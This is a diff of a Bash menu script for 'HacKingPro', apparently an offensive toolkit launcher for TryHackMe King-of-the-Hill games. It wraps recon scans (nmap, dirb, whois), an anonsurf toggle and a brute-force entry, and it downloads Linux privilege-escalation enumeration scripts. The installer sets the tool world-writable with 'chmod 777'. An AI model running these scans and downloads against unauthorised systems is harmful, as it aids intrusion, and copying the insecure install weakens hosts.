+    ${BBlue}[${BYellow}05${BBlue}] ${BYellow} 📜 Password HacKing Menu"
+
+    echo "$HacKingProTargetStatus""
+
+    ${BRed}[${DGrey}01${BRed}]${BBlue} - ${DGrey}🤴 Brutex
+
+    ${BRed}[${LGrey}x${BRed}]${BWhite} -${DGrey} Exit / Quit / Close
+
+    ${BBlue}┌──${BBlue}[${BRed} Arsenal ${BBlue}]${BBlue} - ${DGrey}[${BBlue} Cheat Sheets ${DGrey}] ${BRed}~ ${DGrey}[${BRed} Command ${DGrey}]${BCyan}: $BGreen $ArsenalCommand
+    ${BBlue}|
+    ${DGrey}|──[ ~$(pwd) ]
+    ${DGrey}|
+    ${BYellow}└──[ $Anlominus 👽 ${HacKingPro} ${BYellow}]──╼${BGreen}  ")
+          read -p "$HacKingProMenuMain" cmd
+          case $cmd in
+            1|01 )
+            BruteForce
+            # read -p "$Press_ENTER" readthat
+            cd "$xMenu05"
+            ;;
+            x|X|exit|quit|Exit )
+            clear
+            cd "$XHacKingPro"
+            break
+            ;;
+
+          esac
+        done
+      }
+      MainMenu
+            ;;
+      i|I )
+      echo "\n\t\t ${BRed}[${LGrey}I${BRed}]${BBlue} - ${BYellow}Installing HacKingPro On the System \n"
+      sleep 1
+      echo "\n\t\t ${BRed}[${LGrey}I${BRed}]${BBlue} - ${LYellow}Cloning Into [~/HacKingPro] \n"
+      sleep 1
+      git clone https://github.com/Anlominus/HacKingPro.git ~/HacKingPro
+      echo "\n\t\t ${BRed}[${LGrey}I${BRed}]${BBlue} - ${LYellow}Copying Into [~${bin}/HacKingPro] \n"
+      sleep 1
+      sudo cp -vR ~/HacKingPro $bin/HacKingPro
+      echo "\n\t\t ${BRed}[${LGrey}I${BRed}]${BBlue} - ${LYellow}Giving all Permission To [~${bin}/HacKingPro] \n"
+      sleep 1
+      sudo chmod 777 -R $bin/HacKingPro
+      echo "\n\t\t ${BRed}[${LGrey}I${BRed}]${BBlue} - ${LGreen}Successfully Installed \n"
+      echo "\n\t\t ${BRed}[${LGrey}I${BRed}]${BBlue} - ${LGreen}Installed Direction: $XHacKingPro \n"
+      sleep 1
+      echo "\n\t\t ${BRed}[${LGrey}I${BRed}]${BBlue} - ${BGreen}Open New Terminal And type [:~> HacKingPro ]  \n"
+      sleep 3
+      echo "$XHacKingPro"
+      read -p "$Press_ENTER" finished
+      clear
+      break
+      ;;
+      koth|Koth|KoTH|KOTH )
+      # cd "$xMenuKoTH"
+      # sh KoTH
+      clear
+
+      koth_banner(){
+        #statements
+        echo "
+      $LYellow \t\t █████   ████${BYellow}          ███████████${DGrey} █████   █████
+      $LYellow \t\t░░███   ███░ ${BYellow}         ░█░░░███░░░█${DGrey}░░███   ░░███
+      $LYellow \t\t ░███  ███   ${BYellow}  ██████ ░   ░███  ░ ${DGrey} ░███    ░███
+      $LYellow \t\t ░███████    ${BYellow} ███░░███    ░███    ${DGrey} ░███████████
+      $LYellow \t\t ░███░░███   ${BYellow}░███ ░███    ░███    ${DGrey} ░███░░░░░███
+      $LYellow \t\t ░███ ░░███  ${BYellow}░███ ░███    ░███    ${DGrey} ░███    ░███
+      $LYellow \t\t █████ ░░████${BYellow}░░██████     █████   ${DGrey} █████   █████
+      $LYellow \t\t░░░░░   ░░░░ ${BYellow} ░░░░░░     ░░░░░    ${DGrey}░░░░░   ░░░░░
+                                                            "
+      }
+      koth_banner
+
+      installingONSystem(){
+      cp KoTH  /usr/local/bin/KoTH
+      }
+
+      AnonMainMenu(){
+        while true; do
+        #statements
+        clear
+        koth_banner
+        KoTHMenuMain=$(echo "${BRed}
+                ${BBlue}[${BRed}#${BBlue}] 📜 ${BYellow} Anonimity Surfing Menu
+
+                ${BRed}[${LGrey}1${BRed}]${BBlue} -${DGrey} Anonimity Surfing status
+                ${BRed}[${LGrey}2${BRed}]${BBlue} -${DGrey} Anonimity Surfing start
+                ${BRed}[${LGrey}3${BRed}]${BBlue} -${DGrey} Anonimity Surfing stop
+
+                ${BBlue}[${BRed}#${BBlue}] 📜 ${BYellow} Network Manager Menu
+
+                ${BRed}[${LGrey}4${BRed}]${BBlue} -${DGrey} ifconfig -a
+                ${BRed}[${LGrey}5${BRed}]${BBlue} -${DGrey} ip a
+
+                ${BRed}[${LGrey}x${BRed}]${BWhite} -${DGrey} Exit / Quit / Close
+
+
+      ${BCyan}            ┌──${BBlue}[${BBlue} Anlominus 👽${BRed} KoTH ${BCyan}$~${BBlue}]
+      ${BCyan}            └──╼ ")
+          read -p "$KoTHMenuMain" cmd
+          case $cmd in
+            1 )
+            echo "${BRed}\n\t\t[${LGrey}1${BRed}]${BBlue} -${DGrey} Anonimity Surfing status"
+            anonsurf status
+            sleep 1
+            ;;
+            2 )
+            echo "${BRed}\n\t\t[${LGrey}2${BRed}]${BBlue} -${DGrey} Anonimity Surfing start"
+            anonsurf start
+            sleep 1
+            ;;
+            3 )
+            echo "${BRed}\n\t\t[${LGrey}3${BRed}]${BBlue} -${DGrey} Anonimity Surfing stop"
+            anonsurf stop
+            sleep 1
+            ;;
+            x|X|exit|quit|Exit )
+            clear
+            HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro")
+            echo "\n\t\t ${BRed}[🙏🏼${BRed}] ${BWhite}Exit ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${BGreen}"
+            break
+            ;;
+          esac
+        done
+      }
+
+      privilegeEscalation(){
+        while true; do
+        #statements
+        clear
+        koth_banner
+        KoTHMenuMain=$(echo "${BRed}
+                ${BBlue}[${BRed}#${BBlue}] 📜 ${BYellow} Privilege-Escalation
+
+                ${BRed}[${LGrey}LPE${BRed}]${BBlue} -${DGrey} Linux-PrivEsc
+                ${BRed}[${LGrey}WPE${BRed}]${BBlue} -${DGrey} Windows-PrivEsc
+
+                ${BRed}[${LGrey}x${BRed}]${BWhite} -${DGrey} Exit / Quit / Close
+
+
+      ${BCyan}            ┌──${BBlue}[${BBlue} Anlominus 👽${BRed} KoTH ${BCyan}$~${BBlue}]
+      ${BCyan}            └──╼ ")
+          read -p "$KoTHMenuMain" cmd
+          case $cmd in
+            lpe|LPE )
+            cd $xMenu14
+            cd Linux/Enumeration
+            sleep 1
+            if [ -e linpeas_base.sh ]; then
+              #statements
+              echo "\n${BRed}[${LGrey}LPE${BRed}]${BBlue} -${DGrey} ✅ Found ${BGreen}linpeas_base.sh\n${BBlue}"
+            else
+              echo "\n${BRed}[${LGrey}LPE${BRed}]${BBlue} -${DGrey} 🔶 Downloading ${BGreen}linpeas_base.sh\n${BBlue}"
+              # wget https://raw.githubusercontent.com/Anlominus/HacKingPro/main/Menu/14--Privilege%20Enumeration%20%26%20Escalation/Linux/Enumeration/linpeas_base.sh
+            fi
+            if [ -e linuxallenum.sh ]; then
+              #statements
+              echo "\n${BRed}[${LGrey}LPE${BRed}]${BBlue} -${DGrey} ✅ Found ${BGreen}linuxallenum.sh\n${BBlue}"
+            else
+              echo "\n${BRed}[${LGrey}LPE${BRed}]${BBlue} -${DGrey} 🔶 Downloading ${BGreen}linuxallenum.sh\n${BBlue}"
+              wget https://raw.githubusercontent.com/Anlominus/HacKingPro/main/Menu/14--Privilege%20Enumeration%20%26%20Escalation/Linux/Enumeration/linuxallenum.sh
+            fi
+            if [ -e lse.sh ]; then
+              #statements
+              echo "\n${BRed}[${LGrey}LPE${BRed}]${BBlue} -${DGrey} ✅ Found ${BGreen}lse.sh\n${BBlue}"
+            else
+              echo "\n${BRed}[${LGrey}LPE${BRed}]${BBlue} -${DGrey} 🔶 Downloading ${BGreen}lse.sh\n${BBlue}"
+              wget https://raw.githubusercontent.com/Anlominus/HacKingPro/main/Menu/14--Privilege%20Enumeration%20%26%20Escalation/Linux/Enumeration/lse.sh
+            fi
+            sleep 1
+            echo "\n${BRed}[${LGrey}LPE${BRed}]${BBlue} -${DGrey} ✅ ${BGreen}All Downloaded Linux-PrivEsc GiTools\n"
+            echo "\n${BRed}[${LGrey}LPE${BRed}]${BBlue} -${DGrey} ✅ ${BGreen}Current Directory: \n$(pwd)\n"
+            sleep 1
+            ls -l1
+            echo " "
+            read -p " Press Enter" some
+            ;;
+            wpe|WPE )
+            echo "${BRed}[${LGrey}WPE${BRed}]${BBlue} -${DGrey} Windows-PrivEsc"
+            read_ifconfig="$(ifconfig)"
+            echo "$read_ifconfig"
+            sleep 3
+            echo " "
+            # sleep 1
+            # git clone https://github.com/Anlominus/Windows-PrivEsc
+            # sleep 1
+            ;;
+            x|X|exit|quit|Exit )
+            clear
+            HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro")
+            echo "\n\t\t ${BRed}[🙏🏼${BRed}] ${BWhite}Exit ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${BGreen}"
+            break
+            ;;
+          esac
+        done
+      }
+
+      MainMenu(){
+        while true; do
+        #statements
+        # cd "$xMenuKoTH"
+        tryhackmeVpnIP=$(ifconfig tun0 | grep inet)
+        clear
+        koth_banner
+        # ${BBlue}[${BYellow}#${BBlue}] 🎯 ${BYellow}VPN IP${BBlue}: ${BGreen}${tryhackmeVpnIP}
+        HacKingProTargetStatus=$(echo "
+                ${DGrey}┌──${BRed}[${DGrey} P ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ⚡️ Planning and Scoping 🎯 ${BRed}]
+                ${DGrey}|
+                ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetIP)${BRed}]${DGrey}──╼  ${LRed}IP${BBlue}: ${BGreen}${targetIP}
+                ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetDns)${BRed}]${DGrey}──╼  ${LRed}Dns${BBlue}: ${BGreen}${targetDns}
+                ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetName)${BRed}]${DGrey}──╼  ${LRed}Name${BBlue}: ${BGreen}${targetNAME}
+                ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetEmail)${BRed}]${DGrey}──╼  ${LRed}Email${BBlue}: ${BGreen}${targetEmail}
+                ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetPhone)${BRed}]${DGrey}──╼  ${LRed}Phone${BBlue}: ${BGreen}${targetPhone}
+                ${DGrey}|
+                ${DGrey}└──${BRed}[${DGrey} I ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Install HacKingPro On the System ${BRed}]
+
+                ${DGrey}┌──${BRed}[${DGrey} Full Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} $(date) ${BRed}]
+                ${DGrey}|──${BRed}[${DGrey} Current Date ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${CurrentDate} ${BRed}]
+                ${DGrey}└──${BRed}[${DGrey} Starting Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${StartingTime} ${BRed}]
+      ")
+
+        KoTHMenuMain=$(echo "${BRed}
+          ${BBlue}[${BYellow}#${BBlue}] ${BYellow} 📜 KoTH Main Menu ⌖"
+
+          echo "$HacKingProTargetStatus""
+
+          ${BRed}[${LGrey}a${BRed}]${BBlue} -${DGrey} Anonymity Surfing
+
+          ${BRed}[${LGrey}x${BRed}]${BWhite} -${DGrey} Exit / Quit / Close
+
+
+          ${BBlue}┌──${BBlue}[${BRed} Arsenal ${BBlue}]${BBlue} - ${DGrey}[${BBlue} Cheat Sheets ${DGrey}] ${BRed}~ ${DGrey}[${BRed} Command ${DGrey}]${BCyan}: $BGreen $ArsenalCommand
+          ${BBlue}|
+          ${DGrey}|──[ ~$(pwd) ]
+          ${DGrey}|
+          ${BYellow}└──[ $Anlominus 👽 ${HacKingPro} ${BYellow} KoTH ]──╼${BGreen}  ")
+          read -p "$KoTHMenuMain" cmd
+          case $cmd in
+            i )
+            installingONSystem
+            ;;
+            a )
+            AnonMainMenu
+            ;;
+            # 1 )
+            # echo "\n\t\t${BRed}[${BBlue}1${BRed}]${BWhite} - ${BRed}Planning and Scoping"
+            # #
+            # t1="$(echo "\n${BBlue}[${BYellow}?${BBlue}]${BGreen} - IP / Host of Target / Client: ${BRed}")"
+            # read -p "$t1" targetIP
+            # if [ -z $targetIP ]; then
+            #   #statements
+            #   targetIP="127.0.0.1"
+            # fi
+            # #
+            # t2="$(echo "\n${BBlue}[${BYellow}?${BBlue}]${BGreen} - Name of Target / Client: ${BRed}")"
+            # read -p "$t2" targetLogNAME
+            # if [ -z $targetLogNAME ]; then
+            #   #statements
+            #   targetLogNAME="ChangeMe_SetTarget"
+            #   echo "\n\t\t${BBlue}[${BRed}!${BBlue}]${BGreen} - Name of Target / Client: ${BRed} $targetLogNAME"
+            # fi
+            # #
+            # file="${targetLogNAME}-KoTH-Log.md"
+            # if [ -e ${file} ]; then
+            #   t2="$(echo "\n${BBlue}[${BRed}!${BBlue}]${BRed} - File Exist! Remove it? [yY/nN]: ")"
+            #   read -p "$t2 " filexist
+            #   case $filexist in
+            #     y|Y)
+            #     echo "  ${BBlue}[${BRed}!${BBlue}] Removing {${targetLogNAME}-KoTH-Log.md} file .."
+            #     rm ${targetLogNAME}-KoTH-Log.md
+            #     clear
+            #     ;;
+            #     n|N)
+            #     echo "  ${BBlue}[${BRed}!${BBlue}] Leaving {${targetLogNAME}-KoTH-Log.md} file and Add to it .."
+            #     ;;
+            #   esac
+            # fi
+            #
+            # # Define variable for THM username
+            # read_username=$(echo "\n${BBlue}[${BRed}?${BBlue}]${BGreen} - What Your User Name on TryHackMe: ${BRed} ")
+            # read -p "$read_username" Alm
+            # if [ -z $Alm ]; then
+            #   #statements
+            #   Alm="Anlominus"
+            # fi
+            # username="$Alm"
+            #
+            # # Define directory were $username.ovpn is located
+            # vpn_dir="$HOME/.thm/.vpn"
+            # if [ -d /$HOME/.thm/.vpn ]; then
+            #   #statements
+            #   echo "\n\t\t${BBlue}[${BRed}!${BBlue}]${BGreen} - Found!  TryHackme VPN Path Location exists ! ~>: $DGrey  $vpn_dir  \n"
+            #   ls -lahs $vpn_dir
+            # else
+            #   echo "\n\t\t${BBlue}[${BRed}!${BBlue}]${BGreen} - Creating .vpn Folder In $vpn_dir Directory\n ${BRed} "
+            #   mkdir $HOME/.thm/
+            #   mkdir $HOME/.thm/.vpn
+            #   cd $HOME/.thm/.vpn
+            #   vpn_dir="$HOME/.thm/.vpn"
+            #   ls -lahs $vpn_dir
+            # fi
+            #
+            # # Define variable for our search string (find this running process)
+            # vpn_file="$vpn_dir/$username.ovpn"
+            # if [ -e $vpn_file ]; then
+            #   #statements
+            #   echo "\n\t\t${BBlue}[${BRed}!${BBlue}]${BGreen} - Found TryHackme VPN File ~>: $DGrey  $vpn_file  \n"
+            # else
+            #   cant_found=$(echo "\n${BBlue}[${BRed}!${BBlue}]${BRed} - Sorry Can't Found TryHackme VPN File !! \n\n\t\t  Enter $username.ovpn Location ~>: ")
+            #   read -p "$cant_found"  this_location
+            #   if [ -e $this_location ]; then
+            #     #statements
+            #     echo "\n\t\t${BBlue}[${BRed}!${BBlue}]${BGreen} - Found TryHackme VPN File ~>: $DGrey  $this_location $BRed Copying To $vpn_dir/\n"
+            #     cp $this_location $vpn_file
+            #     ls -lahs $vpn_dir
+            #   else
+            #     echo "\n\t\t${BBlue}[${BRed}!${BBlue}]${BRed} - Sorry Can't Found TryHackme VPN File !! Maybe you dont have it?"
+            #   fi
+            # fi
+            # # Regex pattern to validate IP format (#.#.#.#)
+            # valid_ip="([0-9]{1,3}\.){3}"
+            # valid_thm=".*\.thm$"
+            #
+            # # Session logfile
+            # session_log=$vpn_dir/.logs/KoTH-$(date).log
+            # echo "\n\t\t${BBlue}[${BRed}!${BBlue}]${BGreen} - Session logfile ~>: $DGrey $session_log\n"
+            # ls -lahs $session_log
+            #
+            # # Location of profile to update (.zshrc, .bashrc, .bash_profile, etc)
+            # profile_file=~/.zshrc
+            #
+            # # Save the incoming args to vars with better names (./thm-vm ${targetIP} $2 $3)
+            # arg1=${targetIP}
+            # arg2=$2
+            # arg3=$3
+            #
+            # # Error helper function, prefix with red color and exit 1 (non zero is error)
+            # # https://emojipedia.org/search/?q=warning
+            # # 🚫 🚭 🚨
+            # error() {
+            #   echo "      ${BCyan}  |---------------------------------"
+            #   prefix="\n\t\t [ERROR] \t"
+            #   echo "${BRed}${prefix}${1}${Color_Off}\n"
+            #   echo "      ${BCyan}  |---------------------------------"
+            # }
+            #
+            # # Warning helper function, show warning prefix with yellow color
+            # warn() {
+            #   echo "      ${BCyan}  |---------------------------------"
+            #   prefix="\n\t\t [WARN] \t"
+            #   echo "${BYellow}${prefix}${1}${Color_Off}\n"
+            #   echo "      ${BCyan}  |---------------------------------"
+            # }
+            #
+            # # log log with cyan color & prefix
+            # log() {
+            #   echo "      ${BCyan}  |---------------------------------"
+            #   prefix="\n\t\t [INFO] \t"
+            #   echo "${BCyan}${prefix}${1}${Color_Off}\n"
+            #   echo "      ${BCyan}  |---------------------------------"
+            # }
+            #
+            # # Function to read user input, and return boolean whether they confirm "[Y/n]"
+            # # NOTE: Capital "Y" typically denotes default, so no resp (just enter key) will be "yes" (true)
+            # confirmYes() {
+            #   echo ""
+            #   msg="${1:-Are you sure?}"
+            #   read -r -p "${msg} [Y/n] " response
+            #   case "$response" in
+            #     [nN][oO]|[nN])
+            #       return 1
+            #       ;;
+            #     *)
+            #       return 0
+            #       ;;
+            #   esac
+            # }
+            #
+            # connectVpn() {
+            #   if [ "$vpn_running" != "0" ]; then
+            #     warn "🤨 THM VPN is not running!"
+            #     warn "Searching for process: '$vpn_file' (using ps aux | grep ...)"
+            #     if confirmYes "Connect to VPN now? (requires sudo)"; then
+            #       # sudo echo "init" > $session_log
+            #       sudo openvpn "$vpn_file" > $session_log
+            #       log "Done! 😁"
+            #     fi
+            #   else
+            #     log "Found tun0 & Connection Confirmed 👍"
+            #   fi
+            #   log "THM VPN Connection Confirmed 👍"
+            #   echo "\n\n\t\t  ${BCyan} $(ifconfig tun0) \n"
+            #   echo "\n\n\t\t  ${BCyan} $(ps aux | grep $vpn_file) \n"
+            # }
+            #
+            # hostsModify="$(echo "\n${BBlue}[${BYellow}?${BBlue}] 🔶 ${BGreen}Adding ${BYellow}$targetIP ${targetLogNAME} ${BGreen}to /etc/hosts? [y|Y] or [press ENTER]   ")"
+            # read -p "$hostsModify" hostsMod
+            # case $hostsMod in
+            #   y|Y|yes|YES )
+            #   echo "      ${BBlue}[${BRed}#${BBlue}] 🔶 ${BGreen}Adding $targetIP ${targetLogNAME} to /etc/hosts ${BRed}${tryhackmeVpnIP}"
+            #   echo "$targetIP    ${targetLogNAME}.thm" | sudo tee -a /etc/hosts
+            #     ;;
+            #   n|N|no|NO )
+            #   break
+            #   ;;
+            # esac
+            #
+            # # Check if openvpn connection is running
+            # ifconfig tun0
+            # vpn_running=$?
+            # 0|00 )
+            # #
+            # xMenu02_arp=$(arp -an)
+            # xMenu02_arp_x=$(
+            # echo "\n\t\t${BGreen}### Arp Scan Log Time: $(date)"
+            # echo "# Arp Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            # echo " " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            # echo " $xMenu02_arp " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            # echo " " >> ${targetNAME}-HacKingPro-Recon-Log.)
+            # echo "$xMenu02_arp_x"
+            # read -p "$Press_ENTER"
+            # ;;
+            1|01 )
+            if [ -z $targetIP ]; then
+              Checking_IP_Target
+            else
+              #
+              echo "\n\t\t${BGreen}### TraceRoute Scan Log Time: $(date)"
+              echo "# TraceRoute Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+              echo " $(traceroute $targetIP) " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+              read -p "$Press_ENTER"
+            fi
+            ;;
+            2|02 )
+            if [ -z $targetIP ]; then
+              Checking_IP_Target
+            else
+              #
+              echo "\n\t\t${BGreen}### Ping Scan Log Time: $(date)"
+              echo "# Ping Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+              echo " $(ping $targetIP -c4) " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+              read -p "$Press_ENTER"
+            fi
+            ;;
+            3|03 )
+            #
+            echo "\n\t\t${BGreen}### Nslookup Scan Log Time: $(date)"
+            echo "# Nslookup Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            echo " " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            echo " $(nslookup $targetIP) " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            echo " " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            read -p "$Press_ENTER"
+            ;;
+            4|04 )
+            #
+            echo "\n\t\t${BGreen}### Dig Scan Log Time: $(date)"
+            echo "# Dig Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            echo " " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            echo " $(dig $targetIP all) " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            echo " " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            read -p "$Press_ENTER"
+            ;;
+            5|05 )
+            #
+            echo "\n\t\t${BGreen}### WhoIs Scan Log Time: $(date)"
+            echo "# WhoIs Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            echo " " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            echo " $(whois $targetIP) " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            echo " " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            read -p "$Press_ENTER"
+            ;;
+            6|06 )
+            #
+            echo "\n\t\t${BGreen}### Dirb Scan Log Time: $(date)"
+            echo "# Dirb Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            echo " " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            echo " $(dirb http://$targetIP) " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            echo " " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            read -p "$Press_ENTER"
+            ;;
+            7|07 )
+            #
+            echo "\n\t\t${BGreen}### Nmap Scan Log Time: $(date)"
+            echo "# Nmap Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            echo " " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            echo " $(nmap -sV -sC -O $targetIP) " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            echo " " >> ${targetNAME}-HacKingPro-KoTH-Log.md
+            read -p "$Press_ENTER"
+            ;;
+            # 3 )
+            # echo "\n\t\t${BRed}[${BBlue}3${BRed}]${BWhite} -${BRed} Gaining Access & Maintaining Access"
+            # privilegeEscalation
+            # ;;
+            # 4 )
+            # echo "\n\t\t${BRed}[${BBlue}4${BRed}]${BWhite} -${BRed} Covering tracks"
+            # ;;
+            # 5 )
+            # echo "\n\t\t${BRed}[${BBlue}5${BRed}]${BWhite} -${BRed} Analysis & Reporting"
+            # ;;
+            x|X|exit|quit|Exit )
+            clear
+            HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro")
+            echo "\n\t\t ${BRed}[🙏🏼${BRed}] ${BWhite}Exit ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${BGreen}"
+            break
+            ;;
+
+          esac
+        done
+
+      }
+      MainMenu
+      ;;
+      arsenal|Arsenal|cs|CS|cheats|Cheatsheets|CheatSheets|Commands|commands|zz )
+      Arsenal
+      ;;
+      x|X|exit|quit|Exit )
+      clear
+      echo "$HacKingProExit"
+      exit
+      ;;
+      * )
+      echo "$InvalidOption"
+      ;;
+    esac
+  done
+}
+MainMenu
